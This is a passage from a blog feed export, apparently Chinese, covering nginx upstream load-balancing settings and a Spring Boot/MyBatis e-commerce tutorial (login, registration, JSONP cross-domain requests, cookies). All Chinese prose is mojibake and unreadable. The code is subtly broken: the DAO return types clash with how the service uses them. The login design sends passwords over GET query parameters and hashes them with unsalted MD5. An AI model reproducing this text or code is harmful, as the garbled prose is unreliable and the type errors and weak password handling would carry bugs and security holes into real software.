fail_timeout 20s fail_time=100s;</span><span class="hljs-comment">    # å¦‚æœåœ¨20så†…å¤±è´¥äº†ä¸‰æ¬¡ åˆ™è®©è¯¥æœåŠ¡å™¨åœæ­¢100s</span> <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8082;</span> <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8083;</span> <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8084 backup; </span><span class="hljs-comment"> # å¤‡ç”¨æœº</span> <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8085 down;</span><span class="hljs-comment"> # è¯¥æœåŠ¡å™¨æ°¸è¿œéƒ½ç”¨ä¸ä¸Š</span><span class="hljs-attr">&#125;</span></code></pre><ul><li>max_failsè®¾ç½®åœ¨fail_timeoutå‚æ•°è®¾ç½®çš„æ—¶é—´å†…æœ€å¤§å¤±è´¥æ¬¡æ•°ï¼Œå¦‚æœåœ¨è¿™ä¸ªæ—¶é—´å†…ï¼Œæ‰€æœ‰é’ˆå¯¹è¯¥æœåŠ¡å™¨çš„è¯·æ±‚éƒ½å¤±è´¥äº†ï¼Œé‚£ä¹ˆè®¤ä¸ºè¯¥æœåŠ¡å™¨ä¼šè¢«è®¤ä¸ºæ˜¯åœæœºäº†</li><li>fail_timeout ä¸max_failsç»“åˆä½¿ç”¨</li><li>fail_timeæœåŠ¡å™¨ä¼šè¢«è®¤ä¸ºåœæœºçš„æ—¶é—´é•¿åº¦,é»˜è®¤ä¸º10s</li><li>backupæ ‡è®°è¯¥æœåŠ¡å™¨ä¸ºå¤‡ç”¨æœåŠ¡å™¨,å½“ä¸»æœåŠ¡å™¨åœæ­¢æ—¶ï¼Œè¯·æ±‚ä¼šè¢«å‘é€åˆ°å®ƒè¿™é‡Œ</li><li>downæ ‡è®°æœåŠ¡å™¨æ°¸ä¹…åœæœºäº†</li></ul><h2 id="æƒé‡"><a href="#æƒé‡" class="headerlink" title="æƒé‡"></a>æƒé‡</h2><pre><code class="hljs properties"> <span class="hljs-attr">upstream</span> <span class="hljs-string">myservice &#123;</span>       <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8081 weight=2;</span>    <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8082;</span>    <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8083;</span><span class="hljs-attr">&#125;</span></code></pre><ul><li>æƒé‡æ–¹å¼ï¼Œåœ¨è½®è¯¢ç­–ç•¥çš„åŸºç¡€ä¸ŠæŒ‡å®šè½®è¯¢çš„å‡ ç‡(æ ¹æ®æœåŠ¡å™¨æ€§èƒ½å’Œèµ„æºæƒ…å†µè®¾ç½®å¯¹åº”æƒé‡æ¯”)</li><li>weightå‚æ•°ç”¨äºæŒ‡å®šè½®è¯¢å‡ ç‡,weightçš„é»˜è®¤å€¼ä¸º1ï¼Œweightçš„æ•°å€¼ä¸è®¿é—®æ¯”ç‡æˆæ­£æ¯”</li><li>æƒé‡è¶Šé«˜åˆ†é…åˆ°éœ€è¦å¤„ç†çš„è¯·æ±‚è¶Šå¤š</li><li>æ­¤ç­–ç•¥æ¯”è¾ƒé€‚åˆæœåŠ¡å™¨çš„ç¡¬ä»¶é…ç½®å·®åˆ«æ¯”è¾ƒå¤§çš„æƒ…å†µ</li></ul><h2 id="ip-hash"><a href="#ip-hash" class="headerlink" title="ip_hash"></a>ip_hash</h2><p>æŒ‡å®šè´Ÿè½½å‡è¡¡å™¨æŒ‰ç…§åŸºäºå®¢æˆ·ç«¯IPçš„åˆ†é…æ–¹å¼ï¼Œè¿™ä¸ªæ–¹æ³•ç¡®ä¿äº†ç›¸åŒçš„å®¢æˆ·ç«¯çš„è¯·æ±‚ä¸€ç›´å‘é€åˆ°ç›¸åŒçš„æœåŠ¡å™¨ï¼Œä»¥ä¿è¯sessionä¼šè¯ã€‚è¿™æ ·æ¯ä¸ªè®¿å®¢éƒ½å›ºå®šè®¿é—®ä¸€ä¸ªåç«¯æœåŠ¡å™¨ï¼Œå¯ä»¥è§£å†³sessionä¸èƒ½è·¨æœåŠ¡å™¨çš„é—®é¢˜ã€‚</p><pre><code class="hljs properties"> <span class="hljs-attr">upstream</span> <span class="hljs-string">myservice &#123;</span>     <span class="hljs-meta">ip_hash;</span>  <span class="hljs-string"># ä¿è¯æ¯ä¸ªç”¨æˆ·å›ºå®šè®¿é—®åŒä¸€ä¸ªåç«¯æœåŠ¡å™¨</span>       <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8081 weight=2;</span>    <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8082;</span>    <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8083;</span><span class="hljs-attr">&#125;</span></code></pre><h2 id="least-conn"><a href="#least-conn" class="headerlink" title="least _conn"></a>least _conn</h2><p>æŠŠè¯·æ±‚è½¬å‘ç»™è¿æ¥æ•°è¾ƒå°‘çš„åç«¯æœåŠ¡å™¨ã€‚è½®è¯¢ç®—æ³•æ˜¯æŠŠè¯·æ±‚å¹³å‡çš„è½¬å‘ç»™å„ä¸ªåç«¯ï¼Œä½¿å®ƒä»¬çš„è´Ÿè½½å¤§è‡´ç›¸åŒ;ä½†æ˜¯ï¼Œæœ‰äº›è¯·æ±‚å ç”¨çš„æ—¶é—´å¾ˆé•¿ï¼Œä¼šå¯¼è‡´å…¶æ‰€åœ¨çš„åç«¯è´Ÿè½½è¾ƒé«˜ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œleast _connè¿™ç§æ–¹å¼å°±å¯ä»¥è¾¾åˆ°æ›´å¥½çš„è´Ÿè½½å‡è¡¡æ•ˆæœã€‚</p><pre><code class="hljs properties"> <span class="hljs-attr">upstream</span> <span class="hljs-string">myservice &#123;</span>     <span class="hljs-attr">least</span> <span class="hljs-string">_conn;  # æŠŠè¯·æ±‚è½¬å‘åˆ°è¿æ¥æ•°è¾ƒå°‘çš„fu</span>       <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8081 weight=2;</span>    <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8082;</span>    <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8083;</span><span class="hljs-attr">&#125;</span></code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>nginx</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/07/10/fmmall/"/>
    <url>/2022/07/10/fmmall/</url>
    
    <content type="html"><![CDATA[<p>å•†åŸé¡¹ç›®</p><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/sunzhengyu99/fmmall/tree/master">https://github.com/sunzhengyu99/fmmall/tree/master</a></p><p>ä½“éªŒåœ°å€ï¼š<a href="http://www.fmmall.top/">http://www.fmmall.top/</a></p><h2 id="1-ä¸šåŠ¡é€»è¾‘å¼€å‘"><a href="#1-ä¸šåŠ¡é€»è¾‘å¼€å‘" class="headerlink" title="1.ä¸šåŠ¡é€»è¾‘å¼€å‘"></a>1.ä¸šåŠ¡é€»è¾‘å¼€å‘</h2><h3 id="1-1ç™»å½•æ³¨å†Œ"><a href="#1-1ç™»å½•æ³¨å†Œ" class="headerlink" title="1.1ç™»å½•æ³¨å†Œ"></a>1.1ç™»å½•æ³¨å†Œ</h3><p>1.1.1 å®Œæˆdaoæ“ä½œ</p><ol><li><p>åˆ›å»ºå®ä½“ç±»</p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.entity;<span class="hljs-keyword">import</span> lombok.AllArgsConstructor;<span class="hljs-keyword">import</span> lombok.Data;<span class="hljs-keyword">import</span> lombok.NoArgsConstructor;<span class="hljs-keyword">import</span> java.sql.Date;<span class="hljs-meta">@Data</span><span class="hljs-meta">@AllArgsConstructor</span><span class="hljs-meta">@NoArgsConstructor</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Users</span> </span>&#123;    <span class="hljs-keyword">private</span> Integer userId;    <span class="hljs-keyword">private</span> String username;    <span class="hljs-keyword">private</span> String password;    <span class="hljs-keyword">private</span> String nickname;    <span class="hljs-keyword">private</span> String realname;    <span class="hljs-keyword">private</span> String userImg;    <span class="hljs-keyword">private</span> String userMobile;    <span class="hljs-keyword">private</span> String userEmail;    <span class="hljs-keyword">private</span> String userSex;    <span class="hljs-keyword">private</span> Date userBirth;    <span class="hljs-keyword">private</span> Date userRegtime;    <span class="hljs-keyword">private</span> Date userModtime;&#125;</code></pre></li></ol><ol start="2"><li><p>ç¼–å†™UserDaoæ–‡ä»¶</p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.dao;<span class="hljs-keyword">import</span> com.sunzy.fmmall.entity.User;<span class="hljs-keyword">import</span> com.sunzy.fmmall.entity.Users;<span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Mapper;<span class="hljs-meta">@Mapper</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">UserDao</span> </span>&#123;        <span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">queryUserByName</span><span class="hljs-params">(String name)</span></span>;    <span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">insertUser</span><span class="hljs-params">(Users user)</span></span>;&#125;</code></pre></li></ol><ol start="3"><li><p>ç¼–å†™UserMapper.xml</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">mapper</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="hljs-meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.dao.UserDao&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.entity.Users&quot;</span>&gt;</span>    <span class="hljs-comment">&lt;!--</span><span class="hljs-comment">      WARNING - @mbg.generated</span><span class="hljs-comment">    --&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userId&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;username&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;password&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;nickname&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;nickname&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;realname&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;realname&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_img&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userImg&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_mobile&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userMobile&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_email&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userEmail&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_sex&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;CHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userSex&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_birth&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;DATE&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userBirth&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_regtime&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userRegtime&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_modtime&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userModtime&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;insertUser&quot;</span>&gt;</span>    insert into users(username, password, user_img, user_regtime, user_modtime)    values(#&#123;username&#125;, #&#123;password&#125;,#&#123;userImg&#125;, #&#123;userRegtime&#125;,#&#123;userModtime&#125;)  <span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;queryUserByName&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span>&gt;</span>    select      user_id,      username,      password,      nickname,      realname,      user_img,      user_mobile,      user_email,      user_sex,      user_birth,      user_regtime,      user_modtime    from users    where      username = #&#123;name&#125;  <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span></code></pre></li></ol><p>1.1.2 å®ŒæˆserviceåŠŸèƒ½</p><ol><li><p>åˆ›å»ºæ¥å£<code>com.sunzy.fmmall.service.UserService</code></p><pre><code class="hljs haxe"><span class="hljs-keyword">package</span> com.sunzy.fmmall.service;<span class="hljs-keyword">import</span> com.sunzy.fmmall.vo.ResultVO;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">UserService</span> </span>&#123;    <span class="hljs-keyword">public</span> ResultVO login(<span class="hljs-keyword">String</span> username, <span class="hljs-keyword">String</span> password);    <span class="hljs-keyword">public</span> ResultVO regist(<span class="hljs-keyword">String</span> username, <span class="hljs-keyword">String</span> password);&#125;</code></pre></li></ol><ol start="2"><li><p>åˆ›å»ºå®ç°ç±» <code>com.sunzy.fmmall.service.Impl.UserServiceImpl</code></p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.service.Impl;<span class="hljs-keyword">import</span> com.sunzy.fmmall.dao.UserDao;<span class="hljs-keyword">import</span> com.sunzy.fmmall.entity.Users;<span class="hljs-keyword">import</span> com.sunzy.fmmall.service.UserService;<span class="hljs-keyword">import</span> com.sunzy.fmmall.utils.MD5Utils;<span class="hljs-keyword">import</span> com.sunzy.fmmall.vo.ResStatus;<span class="hljs-keyword">import</span> com.sunzy.fmmall.vo.ResultVO;<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;<span class="hljs-keyword">import</span> org.springframework.transaction.annotation.Transactional;<span class="hljs-keyword">import</span> javax.annotation.Resource;<span class="hljs-keyword">import</span> java.util.Date;<span class="hljs-meta">@Service</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">UserService</span> </span>&#123;    <span class="hljs-meta">@Resource</span>    <span class="hljs-keyword">private</span> UserDao userDao;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">login</span><span class="hljs-params">(String username, String password)</span> </span>&#123;        Users user = userDao.queryUserByName(username);        <span class="hljs-keyword">if</span>(user == <span class="hljs-keyword">null</span>)&#123;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, <span class="hljs-string">&quot;ç”¨æˆ·ä¸å­˜åœ¨ï¼&quot;</span>, <span class="hljs-keyword">null</span>);        &#125;        String realPasswd = user.getPassword();        <span class="hljs-keyword">if</span>(realPasswd.equals(MD5Utils.md5(password)))&#123;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK, <span class="hljs-string">&quot;ç™»å½•æˆåŠŸï¼&quot;</span>, user);        &#125;<span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, <span class="hljs-string">&quot;å¯†ç é”™è¯¯ï¼&quot;</span>, <span class="hljs-keyword">null</span>);        &#125;    &#125;    <span class="hljs-meta">@Transactional</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">regist</span><span class="hljs-params">(String username, String password)</span> </span>&#123;        <span class="hljs-keyword">synchronized</span> (<span class="hljs-keyword">this</span>)&#123;            <span class="hljs-comment">// åˆ¤æ–­ç”¨æˆ·æ˜¯å¦å·²ç»æ³¨å†Œ</span>            Users user = userDao.queryUserByName(username);            <span class="hljs-keyword">if</span>(user == <span class="hljs-keyword">null</span>)&#123;                <span class="hljs-comment">// å°†æ–°ç”¨æˆ·ä¿¡æ¯æ·»åŠ åˆ°æ•°æ®åº“ä¸­</span>                String md5 = MD5Utils.md5(password);                user = <span class="hljs-keyword">new</span> Users();                user.setPassword(md5);                user.setUsername(username);                user.setUserImg(<span class="hljs-string">&quot;img/default.png&quot;</span>);                user.setUserRegtime(<span class="hljs-keyword">new</span> Date());                user.setUserModtime(<span class="hljs-keyword">new</span> Date());                <span class="hljs-keyword">int</span> i = userDao.insertUser(user);                <span class="hljs-keyword">if</span>(i &gt; <span class="hljs-number">0</span>)&#123;                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK, <span class="hljs-string">&quot;ç”¨æˆ·æ³¨å†ŒæˆåŠŸï¼&quot;</span>, user);                &#125;<span class="hljs-keyword">else</span> &#123;                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, <span class="hljs-string">&quot;ç”¨æˆ·æ³¨å†Œå¤±è´¥ï¼&quot;</span>, <span class="hljs-keyword">null</span>);                &#125;            &#125;<span class="hljs-keyword">else</span>&#123;                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, <span class="hljs-string">&quot;ç”¨æˆ·å·²è¢«æ³¨å†Œï¼&quot;</span>, <span class="hljs-keyword">null</span>);            &#125;        &#125;    &#125;&#125;</code></pre></li></ol><p>1.1.3 å®Œæˆcontrollerä»£ç </p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.controller;<span class="hljs-keyword">import</span> com.sunzy.fmmall.entity.Users;<span class="hljs-keyword">import</span> com.sunzy.fmmall.service.UserService;<span class="hljs-keyword">import</span> com.sunzy.fmmall.vo.ResultVO;<span class="hljs-keyword">import</span> io.swagger.annotations.Api;<span class="hljs-keyword">import</span> io.swagger.annotations.ApiImplicitParam;<span class="hljs-keyword">import</span> io.swagger.annotations.ApiImplicitParams;<span class="hljs-keyword">import</span> io.swagger.annotations.ApiOperation;<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;<span class="hljs-comment">//@RequestBody</span><span class="hljs-meta">@RestController</span><span class="hljs-meta">@RequestMapping(&quot;/user&quot;)</span><span class="hljs-meta">@Api(value = &quot;ç”¨æˆ·ç®¡ç†&quot;, tags = &quot;æä¾›ç”¨æˆ·æ³¨å†Œå’Œç™»å½•æ¥å£&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserController</span> </span>&#123;    <span class="hljs-meta">@Autowired</span>    <span class="hljs-keyword">private</span> UserService userService;    <span class="hljs-meta">@ApiOperation(&quot;ç”¨æˆ·ç™»å½•æ¥å£&quot;)</span>    <span class="hljs-meta">@ApiImplicitParams(&#123;</span><span class="hljs-meta">            @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;username&quot;, value = &quot;ç”¨æˆ·è´¦å·&quot;, required = true),</span><span class="hljs-meta">            @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;password&quot;, value = &quot;ç”¨æˆ·å¯†ç &quot;, required = true)</span><span class="hljs-meta">    &#125;)</span>    <span class="hljs-meta">@GetMapping(&quot;/login&quot;)</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">login</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username,</span></span><span class="hljs-function"><span class="hljs-params">                          <span class="hljs-meta">@RequestParam(&quot;password&quot;)</span> String password)</span></span>&#123;        <span class="hljs-keyword">return</span> userService.login(username, password);    &#125;    <span class="hljs-meta">@ApiOperation(&quot;ç”¨æˆ·æ³¨å†Œæ¥å£&quot;)</span><span class="hljs-comment">//    @ApiImplicitParams(&#123;</span><span class="hljs-comment">//            @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;username&quot;, value = &quot;ç”¨æˆ·æ³¨å†Œè´¦å·&quot;, required = true),</span><span class="hljs-comment">//            @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;password&quot;, value = &quot;ç”¨æˆ·æ³¨å†Œå¯†ç &quot;, required = true)</span><span class="hljs-comment">//    &#125;)</span>    <span class="hljs-meta">@PostMapping(&quot;/regist&quot;)</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">regist</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Users user)</span></span>&#123;        String username = user.getUsername();        String password = user.getPassword();        <span class="hljs-keyword">return</span> userService.regist(username, password);    &#125;&#125;</code></pre><p>1.1.4 æ¥å£æµ‹è¯•</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220710210231769.png" alt="image-20220710210231769"></p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220710210251564.png" alt="image-20220710210251564"></p><h3 id="1-2-è§£å†³å‰åç«¯è·¨åŸŸé—®é¢˜"><a href="#1-2-è§£å†³å‰åç«¯è·¨åŸŸé—®é¢˜" class="headerlink" title="1.2 è§£å†³å‰åç«¯è·¨åŸŸé—®é¢˜"></a>1.2 è§£å†³å‰åç«¯è·¨åŸŸé—®é¢˜</h3><p>1.1 å‰ç«¯</p><p><strong>é€šè¿‡jsonpè·¨åŸŸ</strong></p><p>é€šå¸¸ä¸ºäº†å‡è½»webæœåŠ¡å™¨çš„è´Ÿè½½ï¼Œæˆ‘ä»¬æŠŠjsã€cssï¼Œimgç­‰é™æ€èµ„æºåˆ†ç¦»åˆ°å¦ä¸€å°ç‹¬ç«‹åŸŸåçš„æœåŠ¡å™¨ä¸Šï¼Œåœ¨htmlé¡µé¢ä¸­å†é€šè¿‡ç›¸åº”çš„æ ‡ç­¾ä»ä¸åŒåŸŸåä¸‹åŠ è½½é™æ€èµ„æºï¼Œè€Œè¢«æµè§ˆå™¨å…è®¸ï¼ŒåŸºäºæ­¤åŸç†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŠ¨æ€åˆ›å»ºscriptï¼Œå†è¯·æ±‚ä¸€ä¸ªå¸¦å‚ç½‘å€å®ç°è·¨åŸŸé€šä¿¡ã€‚</p><pre><code class="hljs js">&lt;script&gt;   <span class="hljs-keyword">var</span> script = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;script&#x27;</span>);   script.type = <span class="hljs-string">&#x27;text/javascript&#x27;</span>;   <span class="hljs-comment">// ä¼ å‚ä¸€ä¸ªå›è°ƒå‡½æ•°åç»™åç«¯ï¼Œæ–¹ä¾¿åç«¯è¿”å›æ—¶æ‰§è¡Œè¿™ä¸ªåœ¨å‰ç«¯å®šä¹‰çš„å›è°ƒå‡½æ•°</span>   script.src = <span class="hljs-string">&#x27;http://www.domain2.com:8080/login?user=admin&amp;callback=handleCallback&#x27;</span>;   <span class="hljs-built_in">document</span>.head.appendChild(script);   <span class="hljs-comment">// å›è°ƒæ‰§è¡Œå‡½æ•°</span>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handleCallback</span>(<span class="hljs-params">res</span>) </span>&#123;       alert(<span class="hljs-built_in">JSON</span>.stringify(res));   &#125;&lt;/script&gt;</code></pre><p>1.2 åç«¯</p><p>åªéœ€è¦åœ¨controllerä¸­æ·»åŠ <code>@CrossOrigin</code>æ³¨è§£å³å¯å…è®¸åç«¯å“åº”æ•°æ®è¿›è¡Œè·¨åŸŸå“åº”ã€‚</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712100855420.png" alt="image-20220712100855420"></p><h3 id="1-3-å°†ç”¨æˆ·ä¿¡æ¯æ˜¾ç¤ºåœ¨å‰ç«¯"><a href="#1-3-å°†ç”¨æˆ·ä¿¡æ¯æ˜¾ç¤ºåœ¨å‰ç«¯" class="headerlink" title="1.3 å°†ç”¨æˆ·ä¿¡æ¯æ˜¾ç¤ºåœ¨å‰ç«¯"></a>1.3 å°†ç”¨æˆ·ä¿¡æ¯æ˜¾ç¤ºåœ¨å‰ç«¯</h3><p>åœ¨å‰ç«¯ç™»å½•ï¼ˆlogin.htmlçš„doSubmitæ–¹æ³•ä¸­ï¼‰çš„ajaxè¯·æ±‚çš„å“åº”ä»£ç ä¸­åŠ å…¥ä»¥ä¸‹å†…å®¹</p><pre><code class="hljs js"><span class="hljs-keyword">if</span>(vo.code == <span class="hljs-number">10000</span>)&#123;    <span class="hljs-comment">//å¦‚æœç™»å½•æˆåŠŸï¼Œå°±æŠŠtokenå­˜å‚¨åˆ°cookie</span>    setCookieValue(<span class="hljs-string">&quot;token&quot;</span>,vo.msg);    <span class="hljs-comment">//å°†ç”¨æˆ·æ˜µç§°å’Œç”¨æˆ·å¤´åƒçš„è·¯å¾„ä¿å­˜åœ¨cookie</span>    setCookieValue(<span class="hljs-string">&quot;userId&quot;</span>,vo.data.userId);    setCookieValue(<span class="hljs-string">&quot;username&quot;</span>,vo.data.username);    setCookieValue(<span class="hljs-string">&quot;userImg&quot;</span>,vo.data.userImg)&#125;</code></pre><p>å³ç™»å½•æˆåŠŸåï¼Œå°†ç”¨æˆ·çš„tokenå’Œç”¨æˆ·ä¿¡æ¯ä¸€åŒä¿å­˜åˆ°cookieä¸­ï¼Œç”¨äºå‰ç«¯ä¼ å€¼</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712103807945.png" alt="image-20220712103807945"></p><p>åœ¨index.htmlçš„createdå‡½æ•°ä¸­æ·»åŠ ä»¥ä¸‹ä»£ç </p><pre><code class="hljs js"><span class="hljs-keyword">var</span> token = getCookieValue(<span class="hljs-string">&quot;token&quot;</span>);<span class="hljs-keyword">if</span>(token !=<span class="hljs-literal">null</span> &amp;&amp; token !=<span class="hljs-string">&quot;&quot;</span>)&#123;    <span class="hljs-built_in">this</span>.isLogin = <span class="hljs-literal">true</span>;    <span class="hljs-built_in">this</span>.username = getCookieValue(<span class="hljs-string">&quot;username&quot;</span>);    <span class="hljs-built_in">this</span>.userimg = getCookieValue(<span class="hljs-string">&quot;userImg&quot;</span>);&#125;</code></pre><p>è·å–åˆ°ç”¨æˆ·çš„åŸºæœ¬ä¿¡æ¯ï¼Œå†é€šè¿‡v-modelæ˜¾ç¤ºåˆ°å‰ç«¯é¡µé¢ä¸­ã€‚</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712103740058.png" alt="image-20220712103740058"></p><h3 id="1-4-é¦–é¡µè½®æ’­å›¾"><a href="#1-4-é¦–é¡µè½®æ’­å›¾" class="headerlink" title="1.4 é¦–é¡µè½®æ’­å›¾"></a>1.4 